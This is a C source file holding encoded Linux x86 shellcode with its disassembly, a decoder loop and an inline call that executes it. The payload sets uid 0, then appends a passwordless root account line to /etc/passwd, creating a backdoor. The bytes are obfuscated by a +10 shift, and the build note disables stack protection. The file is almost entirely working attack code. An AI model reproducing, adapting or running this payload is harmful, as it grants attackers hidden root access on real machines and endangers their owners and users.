#include <stdio.h>
#include <string.h>
/*
Disassembly of section .text:

00000000 <_start>:
   0:	b0 17                	mov    al,0x17
   2:	cd 80                	int    0x80
   4:	b0 2e                	mov    al,0x2e
   6:	cd 80                	int    0x80
   8:	eb 43                	jmp    4d <starter>

0000000a <pwn>:
   a:	5b                   	pop    ebx
   b:	b0 05                	mov    al,0x5
   d:	66 b9 01 04          	mov    cx,0x401
  11:	cd 80                	int    0x80
  13:	89 c3                	mov    ebx,eax
  15:	52                   	push   edx
  16:	68 6e 2f 73 68       	push   0x68732f6e
  1b:	68 3a 2f 62 69       	push   0x69622f3a
  20:	68 48 45 3a 2f       	push   0x2f3a4548
  25:	68 3a 30 3a 43       	push   0x433a303a
  2a:	68 6c 3a 3a 30       	push   0x303a3a6c
  2f:	68 6e 30 62 79       	push   0x7962306e
  34:	68 63 68 33 72       	push   0x72336863
  39:	89 e1                	mov    ecx,esp
  3b:	b0 04                	mov    al,0x4
  3d:	b2 1c                	mov    dl,0x1c
  3f:	cd 80                	int    0x80
  41:	fe c0                	inc    al
  43:	fe c0                	inc    al
  45:	cd 80                	int    0x80
  47:	31 c0                	xor    eax,eax
  49:	b0 01                	mov    al,0x1
  4b:	cd 80                	int    0x80

0000004d <starter>:
  4d:	e8 b8 ff ff ff       	call   a <pwn>
  52:	2f                   	das    
  53:	2f                   	das    
  54:	65                   	gs
  55:	74 63                	je     ba <starter+0x6d>
  57:	2f                   	das    
  58:	70 61                	jo     bb <starter+0x6e>
  5a:	73 73                	jae    cf <starter+0x82>
  5c:	77 64                	ja     c2 <starter+0x75>

Compilation: gcc -m32 exploit.c -o exploit -fno-stack-protector -z execstack
*/
unsigned char shellcode[] = \
"\xba\x21\xd7\x8a\xba\x38\xd7\x8a\xf5"
"\x4d\x65\xba\x0f\x70\xc3\x0b\x0e\xd7"
"\x8a\x93\xcd\x5c\x72\x78\x39\x7d\x72"
"\x72\x44\x39\x6c\x73\x72\x52\x4f\x44"
"\x39\x72\x44\x3a\x44\x4d\x72\x76\x44"
"\x44\x3a\x72\x78\x3a\x6c\x83\x72\x6d"
"\x72\x3d\x7c\x93\xeb\xba\x0e\xbc\x26"
"\xd7\x8a\x08\xca\x08\xca\xd7\x8a\x3b"
"\xca\xba\x0b\xd7\x8a\xf2\xc2\x09\x09"
"\x09\x39\x39\x6f\x7e\x6d\x39\x7a\x6b"
"\x7d\x7d\x81\x6e";

int shellcodeLenght;
int x;

void decode(lenght) {
	printf("Decoding your shellcode: \n");

	for (x = 0; x < lenght; x++) {
		shellcode[x] = shellcode[x] - 10;
	}
}

void main(void) {
	shellcodeLenght = strlen(shellcode);

	printf("Shellcode Lenght: %d\n", shellcodeLenght);
	decode(shellcodeLenght);
	
	__asm__(
		"xor %eax, %eax\n\t"
		"xor %ebx, %ebx\n\t"
		"xor %ecx, %ecx\n\t"
		"xor %edx, %edx\n\t"

		"call shellcode"
	);
}